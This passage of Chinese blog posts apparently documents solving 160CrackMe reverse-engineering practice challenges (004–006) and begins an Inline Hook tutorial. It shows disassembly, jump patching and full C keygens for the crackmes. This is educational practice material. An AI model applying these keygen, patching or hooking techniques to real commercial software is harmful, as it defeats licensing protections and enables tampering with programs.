进去发现是一个判断你输入的codice中是否含有非数字的一个判断，但是其中又有一点限制，就是第一位如果输入-，+，$，X，x，剩下都是数字的话，也是可以的，反正就是，输入非纯数字的codice以便可以进入后面，如果输入第一位为以上几个的话，那么其中还需要至少再含有一个非数字就可以。 继续分析，再赋值前一条语句的函数就是关键的生成函数，进入分析，发现算法。 123456789101112131415161718192021222324252600442ACD |. B9 01000000 mov ecx,0x100442AD2 |&gt; 8B45 FC /mov eax,dword ptr ss:[ebp-0x4]00442AD5 |. 0FB60408 |movzx eax,byte ptr ds:[eax+ecx]00442AD9 |. BF 11000000 |mov edi,0x1100442ADE |. 33D2 |xor edx,edx00442AE0 |. F7F7 |div edi00442AE2 |. 42 |inc edx00442AE3 |. 8B45 FC |mov eax,dword ptr ss:[ebp-0x4]00442AE6 |. 0FB64408 FF |movzx eax,byte ptr ds:[eax+ecx-0x1]00442AEB |. 0FAFD0 |imul edx,eax00442AEE |. 03F2 |add esi,edx00442AF0 |. 41 |inc ecx ; user32.75B16D5100442AF1 |. 4B |dec ebx00442AF2 |.^ 75 DE \\jnz short aLoNg3x_.00442AD200442AF4 |. EB 02 jmp short aLoNg3x_.00442AF800442AF6 |&gt; 33F6 xor esi,esi00442AF8 |&gt; 8BC6 mov eax,esi00442AFA |. B9 48710000 mov ecx,0x714800442AFF |. 99 cdq00442B00 |. F7F9 idiv ecx ; user32.75B16D5100442B02 |. 8BC2 mov eax,edx00442B04 |. 99 cdq00442B05 |. 33C2 xor eax,edx ; XOR000442B07 |. 2BC2 sub eax,edx ; -000442B09 |. 8BD8 mov ebx,eax00442B0B |. 33C0 xor eax,eax 这里会生成一个标志值，用于后面的计算 123456789int len = strlen(szCodice);int remainder;int sum = 0x37B;for (int i = 1; i &lt; len ; i++) &#123; remainder = szCodice[i] % 0x11 + 1; sum += remainder * szCodice[i - 1];&#125;sum = sum % 0x7148;return sum; 生成标志值之后就可以继续刚才的算法计算了， 12345678910111213141516171819202122232425int len = strlen(szName);int sum = 0;for (int i = 0; i &lt;= len; i++) &#123; for (int j = 0; j &lt;= len; j++) &#123; sum += (szName[i] * szName[len - j]) * FlagNumber; &#125;&#125;__asm &#123; mov eax,sum cdq xor eax,edx sub eax,edx mov ecx,0xA2C2A cdq idiv ecx mov ebx,edx mov sum,ebx&#125;int serial;for (int i = 1; i &lt; 0xFFFFFFFF; i++) &#123; if (((i / 0x59) + (i % 0x50) + 1) == sum) &#123; printf(&quot;codice:%d\\n&quot;, i); break; &#125;&#125; 到这里算出了一个可以用的codice 输入后发现又出现了一个again按钮。 从dedark中找到againClick事件，经过分析发现其实是和OK按钮一模一样的流程，也就是把刚才输入的在输入一次就好了 注册机完整注册机如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;Windows.h&gt;//字母int getFlagNumber(char* szCodice) &#123; int len = strlen(szCodice); int remainder; int sum = 0x37B; for (int i = 1; i &lt; len ; i++) &#123; remainder = szCodice[i] % 0x11 + 1; sum += remainder * szCodice[i - 1]; &#125; sum = sum % 0x7148; return sum;&#125;void OkClick(char* szName,int FlagNumber) &#123; int len = strlen(szName); int sum = 0; for (int i = 0; i &lt;= len; i++) &#123; for (int j = 0; j &lt;= len; j++) &#123; sum += (szName[i] * szName[len - j]) * FlagNumber; &#125; &#125; __asm &#123; mov eax,sum cdq xor eax,edx sub eax,edx mov ecx,0xA2C2A cdq idiv ecx mov ebx,edx mov sum,ebx &#125; int serial; for (int i = 1; i &lt; 0xFFFFFFFF; i++) &#123; if (((i / 0x59) + (i % 0x50) + 1) == sum) &#123; printf(&quot;codice:%d\\n&quot;, i); break; &#125; &#125;&#125;int main() &#123; printf(&quot;请先输入第一位是字母的Codice以便生成标志值\\n&quot;); char Codice[20]; gets_s(Codice, 20); int FlagNumber = getFlagNumber(Codice); printf(&quot;输入用户名\\n&quot;); char name[20]; gets_s(name, 20); OkClick(name, FlagNumber); return 0;&#125; 总结这个程序就是需要先输入非纯数字codice生成一个标志值计算，然后再输入codice就可以了，连续两次即可。注册机那段内联汇编，实在不知道怎么用C写了…","categories":[{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ack1e.github.io/categories/CrackMe/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ack1e.github.io/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ack1e.github.io/tags/CrackMe/"}]},{"title":"160CrackMe-006","slug":"160CrackMe-006","date":"2021-08-02T10:19:24.000Z","updated":"2021-08-09T10:54:13.024Z","comments":true,"path":"2021/08/02/160CrackMe-006/","link":"","permalink":"https://b1ack1e.github.io/2021/08/02/160CrackMe-006/","excerpt":"","text":"初探打开程序如下看到OK是不可点击的，是一个灰色按钮。 点击about查看一下，可以看到我们需要让两个按钮都消失以便可以看到Ringzer0的logo 那么先想办法让OK变得可以点击吧。 分析查看壳，发现未加壳，是用Delphi写的 使用API断点，给IsEnableWindow下断，但是发现怎么都无法断下来，说明肯定是有条件的，而当前还没有满足这个条件。 使用dedark工具帮忙查看，直接分析真的是太难找了，可以看到主要四个事件，这四个事件应该比较关键 根据函数地址找到函数下好断点之后，查看可以发现nomechange和codicechange几乎是一样的，将两处明显的跳转更改条件使跳转失效，让程序跑起来后都会断在之前下的API断点上。那么它们都是比较关键的地方。 第一个关键跳转都是判断eax+0x47这个地址的值是否等于0，而第二个跳转都是先调用了00442A3C这个函数。 nomechange： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596000442E04 /. 55 push ebp ; nomeChange00442E05 |. 8BEC mov ebp,esp00442E07 |. 6A 00 push 0x000442E09 |. 6A 00 push 0x000442E0B |. 53 push ebx00442E0C |. 8BD8 mov ebx,eax00442E0E |. 33C0 xor eax,eax00442E10 |. 55 push ebp00442E11 |. 68 9B2E4400 push aLoNg3x_.00442E9B00442E16 |. 64:FF30 push dword ptr fs:[eax]00442E19 |. 64:8920 mov dword ptr fs:[eax],esp00442E1C |. 8B83 D0020000 mov eax,dword ptr ds:[ebx+0x2D0]00442E22 |. 8078 47 00 cmp byte ptr ds:[eax+0x47],0x000442E26 |. 75 0F jnz short aLoNg3x_.00442E37 ; 关键跳转100442E28 |. B2 01 mov dl,0x100442E2A |. 8B83 CC020000 mov eax,dword ptr ds:[ebx+0x2CC]00442E30 |. 8B08 mov ecx,dword ptr ds:[eax] ; aLoNg3x_.0044282C00442E32 |. FF51 60 call dword ptr ds:[ecx+0x60] ; IsEnableWindow00442E35 |. EB 49 jmp short aLoNg3x_.00442E8000442E37 |&gt; 8D55 FC lea edx,dword ptr ss:[ebp-0x4]00442E3A |. 8B83 E0020000 mov eax,dword ptr ds:[ebx+0x2E0]00442E40 |. E8 7B04FEFF call aLoNg3x_.004232C000442E45 |. 8B45 FC mov eax,dword ptr ss:[ebp-0x4] ; user32.75B1727600442E48 |. 50 push eax00442E49 |. 8D55 F8 lea edx,dword ptr ss:[ebp-0x8]00442E4C |. 8B83 DC020000 mov eax,dword ptr ds:[ebx+0x2DC] ; comctl_1.7464695700442E52 |. E8 6904FEFF call aLoNg3x_.004232C000442E57 |. 8B45 F8 mov eax,dword ptr ss:[ebp-0x8]00442E5A |. 5A pop edx ; aLoNg3x_.0041E13E00442E5B |. E8 DCFBFFFF call aLoNg3x_.00442A3C00442E60 |. 84C0 test al,al00442E62 |. 74 0F je short aLoNg3x_.00442E73 ; 关键跳转200442E64 |. B2 01 mov dl,0x100442E66 |. 8B83 CC020000 mov eax,dword ptr ds:[ebx+0x2CC]00442E6C |. 8B08 mov ecx,dword ptr ds:[eax] ; aLoNg3x_.0044282C00442E6E |. FF51 60 call dword ptr ds:[ecx+0x60] ; IsEnableWindow00442E71 |. EB 0D jmp short aLoNg3x_.00442E8000442E73 |&gt; 33D2 xor edx,edx00442E75 |. 8B83 CC020000 mov eax,dword ptr ds:[ebx+0x2CC]00442E7B |. 8B08 mov ecx,dword ptr ds:[eax] ; aLoNg3x_.0044282C00442E7D |. FF51 60 call dword ptr ds:[ecx+0x60]00442E80 |&gt; 33C0 xor eax,eax00442E82 |. 5A pop edx ; aLoNg3x_.0041E13E00442E83 |. 59 pop ecx ; aLoNg3x_.0041E13E00442E84 |. 59 pop ecx ; aLoNg3x_.0041E13E00442E85 |. 64:8910 mov dword ptr fs:[eax],edx00442E88 |. 68 A22E4400 push aLoNg3x_.00442EA200442E8D |&gt; 8D45 F8 lea eax,dword ptr ss:[ebp-0x8]00442E90 |. BA 02000000 mov edx,0x200442E95 |. E8 4209FCFF call aLoNg3x_.004037DC00442E9A \\. C3 retn00442E9B .^ E9 D803FCFF jmp aLoNg3x_.0040327800442EA0 .^ EB EB jmp short aLoNg3x_.00442E8D00442EA2 . 5B pop ebx ; aLoNg3x_.0041E13E00442EA3 . 59 pop ecx ; aLoNg3x_.0041E13E00442EA4 . 59 pop ecx ; aLoNg3x_.0041E13E00442EA5 . 5D pop ebp ; aLoNg3x_.0041E13E00442EA6 . C3 retn codicechange： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727300442C78 /. 55 push ebp ; codiceChange00442C79 |. 8BEC mov ebp,esp00442C7B |. 33C9 xor ecx,ecx00442C7D |. 51 push ecx00442C7E |. 51 push ecx00442C7F |. 51 push ecx00442C80 |. 51 push ecx00442C81 |. 53 push ebx00442C82 |. 56 push esi00442C83 |. 8BD8 mov ebx,eax00442C85 |. 33C0 xor eax,eax00442C87 |. 55 push ebp00442C88 |. 68 562D4400 push aLoNg3x_.00442D5600442C8D |. 64:FF30 push dword ptr fs:[eax]00442C90 |. 64:8920 mov dword ptr fs:[eax],esp00442C93 |. 8D55 F8 lea edx,dword ptr ss:[ebp-0x8]00442C96 |. 8B83 E0020000 mov eax,dword ptr ds:[ebx+0x2E0]00442C9C |. E8 1F06FEFF call aLoNg3x_.004232C000442CA1 |. 8B45 F8 mov eax,dword ptr ss:[ebp-0x8]00442CA4 |. 8D55 FC lea edx,dword ptr ss:[ebp-0x4]00442CA7 |. E8 ACFCFBFF call aLoNg3x_.0040295800442CAC |. 8BF0 mov esi,eax00442CAE |. 837D FC 00 cmp dword ptr ss:[ebp-0x4],0x000442CB2 |. 74 18 je short aLoNg3x_.00442CCC00442CB4 |. 8D55 F4 lea edx,dword ptr ss:[ebp-0xC]00442CB7 |. 8BC6 mov eax,esi00442CB9 |. E8 8249FCFF call aLoNg3x_.0040764000442CBE |. 8B55 F4 mov edx,dword ptr ss:[ebp-0xC]00442CC1 |. 8B83 E0020000 mov eax,dword ptr ds:[ebx+0x2E0]00442CC7 |. E8 2406FEFF call aLoNg3x_.004232F000442CCC |&gt; 8B83 D0020000 mov eax,dword ptr ds:[ebx+0x2D0]00442CD2 |. 8078 47 00 cmp byte ptr ds:[eax+0x47],0x000442CD6 |. 75 0F jnz short aLoNg3x_.00442CE7 ; 关键跳转100442CD8 |. B2 01 mov dl,0x100442CDA |. 8B83 CC020000 mov eax,dword ptr ds:[ebx+0x2CC] ; comctl_1.7464695700442CE0 |. 8B08 mov ecx,dword ptr ds:[eax] ; aLoNg3x_.0044282C00442CE2 |. FF51 60 call dword ptr ds:[ecx+0x60] ; IsEnableWindow00442CE5 |. EB 49 jmp short aLoNg3x_.00442D3000442CE7 |&gt; 8D55 F8 lea edx,dword ptr ss:[ebp-0x8]00442CEA |. 8B83 E0020000 mov eax,dword ptr ds:[ebx+0x2E0]00442CF0 |. E8 CB05FEFF call aLoNg3x_.004232C000442CF5 |. 8B45 F8 mov eax,dword ptr ss:[ebp-0x8]00442CF8 |. 50 push eax00442CF9 |. 8D55 F0 lea edx,dword ptr ss:[ebp-0x10]00442CFC |. 8B83 DC020000 mov eax,dword ptr ds:[ebx+0x2DC]00442D02 |. E8 B905FEFF call aLoNg3x_.004232C000442D07 |. 8B45 F0 mov eax,dword ptr ss:[ebp-0x10]00442D0A |. 5A pop edx ; aLoNg3x_.0041E13E00442D0B |. E8 2CFDFFFF call aLoNg3x_.00442A3C00442D10 |. 84C0 test al,al00442D12 |. 74 0F je short aLoNg3x_.00442D23 ; 关键跳转200442D14 |. B2 01 mov dl,0x100442D16 |. 8B83 CC020000 mov eax,dword ptr ds:[ebx+0x2CC] ; comctl_1.7464695700442D1C |. 8B08 mov ecx,dword ptr ds:[eax] ; aLoNg3x_.0044282C00442D1E |. FF51 60 call dword ptr ds:[ecx+0x60] ; IsEnableWindow00442D21 |. EB 0D jmp short aLoNg3x_.00442D3000442D23 |&gt; 33D2 xor edx,edx00442D25 |. 8B83 CC020000 mov eax,dword ptr ds:[ebx+0x2CC] ; comctl_1.7464695700442D2B |. 8B08 mov ecx,dword ptr ds:[eax] ; aLoNg3x_.0044282C00442D2D |. FF51 60 call dword ptr ds:[ecx+0x60]00442D30 |&gt; 33C0 xor eax,eax00442D32 |. 5A pop edx ; aLoNg3x_.0041E13E00442D33 |. 59 pop ecx ; aLoNg3x_.0041E13E00442D34 |. 59 pop ecx ; aLoNg3x_.0041E13E00442D35 |. 64:8910 mov dword ptr fs:[eax],edx00442D38 |. 68 5D2D4400 push aLoNg3x_.00442D5D00442D3D |&gt; 8D45 F0 lea eax,dword ptr ss:[ebp-0x10]00442D40 |. E8 730AFCFF call aLoNg3x_.004037B800442D45 |. 8D45 F4 lea eax,dword ptr ss:[ebp-0xC]00442D48 |. E8 6B0AFCFF call aLoNg3x_.004037B800442D4D |. 8D45 F8 lea eax,dword ptr ss:[ebp-0x8]00442D50 |. E8 630AFCFF call aLoNg3x_.004037B800442D55 \\. C3 retn 尝试在eax+0x47这下硬件写入断点，发现并不能断下来，说明还是没有满足某个条件。 看第二个关键函数，可以看到一个计算，通过用户名算出serial，懒得再解释了QAQ，直接看下面代码吧。 1234567891011121314151600442A8E |. B8 01000000 mov eax,0x100442A93 |&gt; 8B4D FC /mov ecx,dword ptr ss:[ebp-0x4] ; user32.75B1727600442A96 |. 0FB64C01 FF |movzx ecx,byte ptr ds:[ecx+eax-0x1]00442A9B |. 8B75 FC |mov esi,dword ptr ss:[ebp-0x4] ; user32.75B1727600442A9E |. 0FB63406 |movzx esi,byte ptr ds:[esi+eax]00442AA2 |. 0FAFCE |imul ecx,esi00442AA5 |. 0FAFC8 |imul ecx,eax00442AA8 |. 03D9 |add ebx,ecx00442AAA |. 40 |inc eax00442AAB |. 4A |dec edx00442AAC |.^ 75 E5 \\jnz short aLoNg3x_.00442A9300442AAE |&gt; 8B45 F8 mov eax,dword ptr ss:[ebp-0x8]00442AB1 |. E8 BA4BFCFF call aLoNg3x_.0040767000442AB6 |. 2BD8 sub ebx,eax00442AB8 |. 81FB 9A020000 cmp ebx,0x29A00442ABE |. 75 04 jnz short aLoNg3x_.00442AC4 12345678910int len = strlen(szname);int sum = len;int temp = 1;for (int i = 0; i &lt; len - 1; i++) &#123; sum = ((szname[i] * szname[i + 1]) * temp) + sum; temp++;&#125;int serial;serial = sum - 0x29A;printf(&quot;%d\\n&quot;, serial); 输入发现OK按钮已经亮了 点击OK按钮发现，没有用，codice清0，然后OK又灰色了。 从OK按钮入手，发现刚进来的第一个跳转就是熟悉的判断条件，说明程序并不是直接点击OK的，在这之前肯定还有一个条件要满足的。先继续在这里看一下，修改这个条件往下走，可以看到第二个跳转，修改这个跳转，按钮就会小时，经过分析之前这个函数就是算法。 1234567891011121314151617181920212223242526272829303132333435363738394041424300442D64 /. 55 push ebp00442D65 |. 8BEC mov ebp,esp00442D67 |. 6A 00 push 0x000442D69 |. 53 push ebx00442D6A |. 8BD8 mov ebx,eax00442D6C |. 33C0 xor eax,eax00442D6E |. 55 push ebp00442D6F |. 68 ED2D4400 push aLoNg3x_.00442DED00442D74 |. 64:FF30 push dword ptr fs:[eax]00442D77 |. 64:8920 mov dword ptr fs:[eax],esp00442D7A |. 8B83 D0020000 mov eax,dword ptr ds:[ebx+0x2D0]00442D80 |. 8078 47 01 cmp byte ptr ds:[eax+0x47],0x1 ; 熟悉的地址00442D84 |. 75 12 jnz short aLoNg3x_.00442D9800442D86 |. BA 002E4400 mov edx,aLoNg3x_.00442E00 ; UNICODE &quot;0&quot;00442D8B |. 8B83 E0020000 mov eax,dword ptr ds:[ebx+0x2E0]00442D91 |. E8 5A05FEFF call aLoNg3x_.004232F000442D96 |. EB 3F jmp short aLoNg3x_.00442DD700442D98 |&gt; 8D55 FC lea edx,dword ptr ss:[ebp-0x4]00442D9B |. 8B83 E0020000 mov eax,dword ptr ds:[ebx+0x2E0]00442DA1 |. E8 1A05FEFF call aLoNg3x_.004232C000442DA6 |. 8B45 FC mov eax,dword ptr ss:[ebp-0x4]00442DA9 |. E8 C248FCFF call aLoNg3x_.0040767000442DAE |. 50 push eax00442DAF |. 8D55 FC lea edx,dword ptr ss:[ebp-0x4]00442DB2 |. 8B83 DC020000 mov eax,dword ptr ds:[ebx+0x2DC]00442DB8 |. E8 0305FEFF call aLoNg3x_.004232C000442DBD |. 8B45 FC mov eax,dword ptr ss:[ebp-0x4]00442DC0 |. 5A pop edx ; 0018F8D400442DC1 |. E8 DAFDFFFF call aLoNg3x_.00442BA0 ; 算法00442DC6 |. 84C0 test al,al00442DC8 |. 74 0D je short aLoNg3x_.00442DD700442DCA |. 33D2 xor edx,edx00442DCC |. 8B83 CC020000 mov eax,dword ptr ds:[ebx+0x2CC]00442DD2 |. E8 D903FEFF call aLoNg3x_.004231B000442DD7 |&gt; 33C0 xor eax,eax00442DD9 |. 5A pop edx ; 0018F8D400442DDA |. 59 pop ecx ; 0018F8D400442DDB |. 59 pop ecx ; 0018F8D400442DDC |. 64:8910 mov dword ptr fs:[eax],edx00442DDF |. 68 F42D4400 push aLoNg3x_.00442DF400442DE4 |&gt; 8D45 FC lea eax,dword ptr ss:[ebp-0x4]00442DE7 |. E8 CC09FCFF call aLoNg3x_.004037B800442DEC \\. C3 retn 进入算法进行查看，可以看到一个通过注册码求用户名的过程。 123456789101112131415161700442C09 |. 0FB64430 FF |movzx eax,byte ptr ds:[eax+esi-0x1] ; 获取最后一位00442C0E |. F7E8 |imul eax ; 平方00442C10 |. 0FBFC0 |movsx eax,ax00442C13 |. F7EE |imul esi ; 乘以长度/长度不断-100442C15 |. B9 19000000 |mov ecx,0x1900442C1A |. 99 |cdq00442C1B |. F7F9 |idiv ecx00442C1D |. 83C2 41 |add edx,0x41 ; 除以0x19余数+0x4100442C20 |. 58 |pop eax ; 0018F8D400442C21 |. 8810 |mov byte ptr ds:[eax],dl00442C23 |. 4E |dec esi00442C24 |. 85F6 |test esi,esi00442C26 |.^ 75 D1 \\jnz short aLoNg3x_.00442BF900442C28 |&gt; 8B45 F4 mov eax,dword ptr ss:[ebp-0xC]00442C2B |. 8B55 FC mov edx,dword ptr ss:[ebp-0x4]00442C2E |. E8 110FFCFF call aLoNg3x_.00403B44 ; 与输入的用户名进行比较00442C33 |. 75 17 jnz short aLoNg3x_.00442C4C 代码如下： 12345678910111213char name[20];itoa(serial, name,10);int len = strlen(name);int a = len;for (int i = 0; i &lt; len; i++) &#123; int temp = name[a-1] * name[a-1]; temp = temp * a; temp = temp % 0x19; temp = temp + 0x41; name[a - 1] = temp; a = a - 1;&#125;printf(&quot;%s\\n&quot;, name); 现在就剩下最后一个事件，CancellaClick 进去查看，发现里面没有那个熟悉的地址，那么基本上那个地址的赋值应该就是在这里了吧，只有一个跳转，修改条件后，最早下的硬件断点终于断下来了。那么查看一下算法的过程。 进入函数查看，可以看到具体的算法，是一个通过用户名求注册码的过程。 1234567891011121314151617181920212223242526272829303100442B20 |. 83F8 05 cmp eax,0x5 ; 判断输入的name是否大于500442B23 |. 7E 53 jle short aLoNg3x_.00442B7800442B25 |. 8B45 FC mov eax,dword ptr ss:[ebp-0x4]00442B28 |. 0FB640 04 movzx eax,byte ptr ds:[eax+0x4] ; 获取name第五位00442B2C |. B9 07000000 mov ecx,0x700442B31 |. 33D2 xor edx,edx00442B33 |. F7F1 div ecx ; 除以700442B35 |. 8BC2 mov eax,edx ; 余数00442B37 |. 83C0 02 add eax,0x200442B3A |. E8 E1FEFFFF call aLoNg3x_.00442A20 ; 阶乘00442B3F |. 8BF0 mov esi,eax00442B41 |. 33DB xor ebx,ebx00442B43 |. 8B45 FC mov eax,dword ptr ss:[ebp-0x4]00442B46 |. E8 E90EFCFF call aLoNg3x_.00403A3400442B4B |. 85C0 test eax,eax00442B4D |. 7E 16 jle short aLoNg3x_.00442B6500442B4F |. BA 01000000 mov edx,0x100442B54 |&gt; 8B4D FC /mov ecx,dword ptr ss:[ebp-0x4]00442B57 |. 0FB64C11 FF |movzx ecx,byte ptr ds:[ecx+edx-0x1] ; 逐位获取00442B5C |. 0FAFCE |imul ecx,esi00442B5F |. 03D9 |add ebx,ecx ; user32.75B16D5100442B61 |. 42 |inc edx00442B62 |. 48 |dec eax00442B63 |.^ 75 EF \\jnz short aLoNg3x_.00442B5400442B65 |&gt; 2B5D F8 sub ebx,dword ptr ss:[ebp-0x8] ; 减去注册码十六进制00442B68 |. 81FB 697A0000 cmp ebx,0x7A6900442B6E |. 75 04 jnz short aLoNg3x_.00442B7400442B70 |. B3 01 mov bl,0x1 ; 关键的赋值00442B72 |. EB 06 jmp short aLoNg3x_.00442B7A00442B74 |&gt; 33DB xor ebx,ebx00442B76 |. EB 02 jmp short aLoNg3x_.00442B7A 代码如下： 123456789101112131415int a = szname[4] % 0x7;a = a + 2;int num = 1;for (int i = 1; i &lt;= a; i++) &#123; num = num * i;&#125;int len = strlen(szname);int sum = 0;for (int i = 0; i &lt; len; i++) &#123; sum += szname[i] * num;&#125;int serial;serial = sum - 0x7A69;printf(&quot;%d\\n&quot;, serial);return serial; 当经过了这个判断之后，那个地址就会被赋值，同时cancle按钮也会消失，ok按钮会常亮。 那么整体的流程就很清楚，首先要通过用户名计算一个注册码输入cancle按钮消失，ok变亮，然后再通过注册码计算出一个用户名输入后，ok消失，完成注册 注册机编写完整注册机代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;#include &lt;string.h&gt;int CancleClick(char* szname) &#123; int a = szname[4] % 0x7; a = a + 2; int num = 1; for (int i = 1; i &lt;= a; i++) &#123; num = num * i; &#125; int len = strlen(szname); int sum = 0; for (int i = 0; i &lt; len; i++) &#123; sum += szname[i] * num; &#125; int serial; serial = sum - 0x7A69; printf(&quot;%d\\n&quot;, serial); return serial;&#125;void CodiceChange(char* szname) &#123; int len = strlen(szname); int sum = len; int temp = 1; for (int i = 0; i &lt; len - 1; i++) &#123; sum = ((szname[i] * szname[i + 1]) * temp) + sum; temp++; &#125; int serial; serial = sum - 0x29A; printf(&quot;%d\\n&quot;, serial);&#125;void OkClick(int serial) &#123; char name[20]; itoa(serial, name,10); int len = strlen(name); int a = len; for (int i = 0; i &lt; len; i++) &#123; int temp = name[a-1] * name[a-1]; temp = temp * a; temp = temp % 0x19; temp = temp + 0x41; name[a - 1] = temp; a = a - 1; &#125; printf(&quot;%s\\n&quot;, name);&#125;int main() &#123; char name[20]; gets_s(name, 20); printf(&quot;让cancle消失，通过用户名求出的serial\\n&quot;); int serial = CancleClick(name); printf(&quot;-------------------------\\n&quot;); printf(&quot;仅仅只是显示OK按钮\\n&quot;); CodiceChange(name); printf(&quot;-------------------------\\n&quot;); printf(&quot;让OK消失，通过serial：%d\\n求出的用户名\\n&quot;,serial); OkClick(serial); return 0;&#125; cancle按钮 OK按钮 总结程序共有三个算法 nomechange和codicechange里的，仅仅只是让OK亮起来 cancleClick里的，消失cancle按钮，赋值给那个关键地方，OK亮起 OKClick里的，让OK按钮消失 不知道nomechange和codicechange里的算法有什么用，感觉没必要。。。","categories":[{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ack1e.github.io/categories/CrackMe/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ack1e.github.io/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ack1e.github.io/tags/CrackMe/"}]},{"title":"160CrackMe-004","slug":"160CrackMe-004","date":"2021-07-29T02:29:39.000Z","updated":"2021-08-09T10:53:54.343Z","comments":true,"path":"2021/07/29/160CrackMe-004/","link":"","permalink":"https://b1ack1e.github.io/2021/07/29/160CrackMe-004/","excerpt":"","text":"初探打开程序，看到需要输入用户名和注册码，提示如果正确下面会出现一张朱茵的照片。 分析使用DIE查看一下，无壳，使用Delphi编写的。 使用OD搜索一下字符串，可以看到几个字符串，其中有恭喜注册成功的字样，可以看到还有黑头这样的问题，但是点进去查看没有什么。 下断点在恭喜这里，但是看不到什么有用的信息，在获取用户名的长度，然后加上循环次数这样，但是这并不是注册码，然后跳转的关键在esi+0x30c这里，如果这里的值不等于0x85就会跳转到失败。 此时想到刚才的黑头这样的字样，在程序中出现这样的感觉多少会和注册码有点关系。 那个地方只有在程序运行的时候才会到达，当跑起来下断是不会断下来的，那里如果出现这样的字眼，并且调用的都是同一个函数，那么有没有可能就是把字符串存在内存里，找到地方下一个断点看看，如果注册码确实用到的话肯定会调用。 根据字符串找到地方跟一下，发现这里有一个地方向一个地址写入了这些字符串，在这里下一个硬件访问断点看看。 下断点之后，刚输入注册码就断下来在一个地方，跑几步，看到寄存器有一个值，这很像注册码。 大致分析看一下，可以看到在这里有一个向esi+0x30c写入3c的地方，这里有一个JNZ决定是否执行，那么这里应该是一个很关键的地方 看这里，在前面进行了一个比较，然后决定是否跳转。12345是我们输入的注册码 而黑头Sun Bird12dseloffc-012-OKb1ackie这个是生成的，可以看到b1ackie是用户名目前只有中间这个12不知道是如何生成的，继续分析一下。 1234500457D2C |. 8B45 E0 mov eax,dword ptr ss:[ebp-0x20] ; 输入的注册码00457D2F |. 8B93 18030000 mov edx,dword ptr ds:[ebx+0x318] ; 生成的00457D35 |. E8 52BFFAFF call CKme.00403C8C00457D3A |. 75 0A jnz short CKme.00457D4600457D3C |. C783 0C030000&gt;mov dword ptr ds:[ebx+0x30C],0x3E 这个数字是在前面生成的，是根据输入用户名的长度加上0x5生成的。ebx+0x2F8中是长度，可以通过同样的下断点方法去分析这里的值。 12345600457C66 |. 8BB3 F8020000 mov esi,dword ptr ds:[ebx+0x2F8] ; 用户名长度00457C6C |. 83C6 05 add esi,0x5 ; 加上0x500457C6F |. FFB3 10030000 push dword ptr ds:[ebx+0x310]00457C75 |. 8D55 F8 lea edx,dword ptr ss:[ebp-0x8]00457C78 |. 8BC6 mov eax,esi00457C7A |. E8 85FEFAFF call CKme.00407B04 ; 转字符串（10进制） 这里只要相等就会给关键地址赋值0x3E，但是并不是0x85，继续在这里下断点看一下什么情况。（此时输入黑头Sun Bird12dseloffc-012-OKb1ackie就可以注册成功，不过点击一次是不行的，要连续点击好几次才行） 但是每次点击都会断在恭喜的那个JNZ那里，可以发现值并没有被改变，还是3E，是我断点的问题，不要下访问断点，改成写入断点，看看在哪里可以写入85。 然后疯狂点击图片，就会断下来，可以看到这里先判断是否等于0x3E然后再赋值0x85。 什么情况才会到这里，其实就是双击会到这里，而普通的点击就是刚开始0x85比较那里，还是借助Dedark工具可以看的更仔细，可以看到事件，用这个工具可以很方便的定位到刚才的几个地方而不需要借助硬件断点，很方便。 那么现在整个流程就清楚了，需要输入正确的注册码之后，先双击再点击就可以成功注册。 注册机编写注册码很简单，获取用户名的长度，然后加上5，放在黑头Sun Bird和dseloffc-012-OK中间，最后再加上用户名即可。 123456789101112#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main() &#123; printf(&quot;输入name：\\n&quot;); char name[20]; gets_s(name, 20); int len = strlen(name); len += 5; printf(&quot;注册码：\\n&quot;); printf(&quot;黑头Sun Bird%ddseloffc-012-OK%s&quot;, len, name);&#125;","categories":[{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ack1e.github.io/categories/CrackMe/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ack1e.github.io/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ack1e.github.io/tags/CrackMe/"}]},{"title":"HOOK-Inline Hook","slug":"HOOK-Inline Hook","date":"2021-07-28T03:17:15.000Z","updated":"2021-08-09T10:53:26.775Z","comments":true,"path":"2021/07/28/HOOK-Inline Hook/","link":"","permalink":"https://b1ack1e.github.io/2021/07/28/HOOK-Inline%20Hook/","excerpt":"","text":"Inline HookInline Hook是Hook技术的一种，它是通过修改机器码来实现HOOK。当我们正常调用一个API函数时，正常的流程是，call API，然后就会到函数内部执行。我们写下如下语句，在OD中打开就是如图的样子。可以看到先压入参数，然后调用MessageBoxA函数。 1MessageBoxA(NULL, &quot;这是本来的窗口&quot;, &quot;未被HOOK&quot;, MB_OK); 进入函数可以看到函数的具体 Inline Hook就是了通过字节码更改了函数的流程，刚才我们看到的是正常的流程，如果调用正常函数的时候，我们修改它的执行流程，使其跳转到我们自定义的函数内部去执行就可以实现Inlie HOOK。 如何实现通过上面我们知道了，我们需要修改的就是程序的执行流程，而改变程序的执行流程就是jmp、call等，我们用最常见的jmp来进行分析。 如图可以看到一条JMP指令，看到后面的地址是0x401254，再看旁边的机器码是E9 EF000000。我们知道E9是JMP的机器码，那么EF000000为什么和要跳转的地址不一样呢。这是因为在JMP后面使用的是一个偏移量而不是一个具体的地址。如果使用地址的话，数据重定位之后，每次都会变，但是使用偏移就不一样了。 100401160 . /E9 EF000000 jmp InlineHo.00401254 JMP后的偏移计算公式是： 偏移=目的地址-原地址-5 5是JMP指令的长度，如果是其他的一些指令的话，那么这里不是5，可能是6、7所以要注意要根据具体情况而来。 